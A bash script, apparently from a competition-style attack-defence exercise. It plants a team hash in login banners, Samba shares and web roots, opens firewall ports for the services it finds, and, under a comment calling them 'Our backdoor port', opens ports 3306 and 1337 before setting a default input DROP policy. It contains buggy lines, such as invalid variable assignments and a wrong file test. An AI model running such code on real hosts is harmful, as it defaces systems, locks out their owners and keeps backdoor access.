#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

teamhash="102ED6BC"
hashRegex="[a-zA-Z0-9]{8}"


root=1
echo "[*] Running as user - $(whoami)" 
if ! [ $(id -u) = 0 ]; then
    $root=0
fi

dns_service ()
{
    if [ -d "/var/named" ]; then
        echo "[*] Found /var/named - eneumerating DNS records" 
    fi
    if [ -d "/etc/bind" ]; then
        echo "[*] Found /etc/bind - eneumerating DNS records" 
        if [ -f "/etc/bind/named.conf" ]; then
            echo "[*] Found the default bind config file - Adding team record"
            #echo "zone \"1.1.1.in-addr.arpa\" {\n type master; \n notify no; \n1\tIN\tPTR\t$teamhash.\n};":
        fi
    fi

}

samba_service ()
{

    if [ -f "/etc/samba/smb.conf" ]; then
        echo "[*] Found a /etc/samba/smb.conf - eneumerating shares" 
        shares=$(cat /etc/samba/smb.conf | egrep "^[^;#]*path" | cut -d= -f 2 |  sed 's/^\s//g' | sed 's/\s$//g')
        for share in $shares; do
            if [ -d $share ]; then
                $share = $share | sed 's/\/$//g'
                echo "[*] Found $share - copying flag file"
                flag="/ownership.txt"
                flagFile=$share$flag
                echo $teamhash > $flagFile
            fi
        done
    fi
}

console_service ()
{
    if [ -f "/etc/banner" ]; then
        echo "[*] Found an /etc/banner - Writing team hash" 
        cp /etc/banner /etc/banner.old
        echo $teamhash >> /etc/banner
    fi

    if [ -f "/etc/issue" ]; then
        echo "[*] Found an /etc/issue - Writing team hash" 
        cp /etc/issue /etc/issue.old
        echo $teamhash >> /etc/issue
    fi
    
    if [ -f "/etc/issue" ]; then
        echo "[*] Found an /etc/issue.net - Writing team hash" 
        cp /etc/issue.net /etc/issue.net.old
        echo $teamhash >> /etc/issue.net
    fi
    
    if [ -f "/etc/motd" ]; then
        echo "[*] Found an /etc/motd - Writing team hash" 
        cp /etc/motd /etc/motd.old
        echo $teamhash >> /etc/motd
    fi
}

http_service ()
{
    if [ -d "/var/www" ]; then
        echo "[*] Found /var/www - eneumerating web directories"
        if [ -d "/var/www/html" ]; then
            echo "[*] Found /var/www/html - writing hash"
            echo $teamhash > /var/www/html/ownership.html
        fi
    fi
}


if netstat -natpu | grep LISTEN > /dev/null; then
    echo "[*] Found something listening"
    if netstat -natpu | grep LISTEN | grep :21 > /dev/null; then
        echo "[*] FTP service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting ftp iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 21 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :22 > /dev/null; then
        echo "[*] SSH service discovered"
        console_service
        if [ $root -eq 1 ]; then
            echo "[*] Setting ssh iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 22 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :23 > /dev/null; then
        echo "[*] Telnet service discovered"
        console_service
        if [ $root -eq 1 ]; then
            echo "[*] Setting telnet iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 23 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :25 > /dev/null; then
        echo "[*] SMTP service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting smtp iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 25 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :53 > /dev/null; then
        echo "[*] DNS service discovered"
        dns_service
        if [ $root -eq 1 ]; then
            echo "[*] Setting dns iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 53 -j ACCEPT
            iptables -A INPUT -p udp --dport 53 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :80 > /dev/null; then
        echo "[*] HTTP service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting http iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 80 -j ACCEPT
        fi
        http_service
    fi
    if netstat -natpu | grep LISTEN | grep :110 > /dev/null; then
        echo "[*] POP3 service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting pop3 iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 110 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :137 > /dev/null; then
        echo "[*] SAMBA service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting samba iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 137 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :138 > /dev/null; then
        echo "[*] SAMBA service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting samba iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 138 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :139 > /dev/null; then
        echo "[*] SAMBA service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting samba iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 139 -j ACCEPT
        fi
    fi
    if netstat -natpu | grep LISTEN | grep :443 > /dev/null; then
        echo "[*] HTTP service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting https iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 443 -j ACCEPT
        fi
        http_service
    fi
    if netstat -natpu | grep LISTEN | grep :445 > /dev/null; then
        echo "[*] SAMBA service discovered"
        if [ $root -eq 1 ]; then
            echo "[*] Setting samba iptables ACCEPT rule"
            iptables -A INPUT -p tcp --dport 445 -j ACCEPT
        fi
    fi
    if [ $root -eq 1 ]; then
        echo "[*] Setting default iptables deny rule"
        #Our backdoor port
        iptables -A INPUT -p tcp --dport 3306 -j ACCEPT
        iptables -A INPUT -p tcp --dport 1337 -j ACCEPT
        iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
        iptables -P INPUT DROP
        iptables -P OUTPUT ACCEPT
    fi
else
    echo "[!] No listening services found"
fi
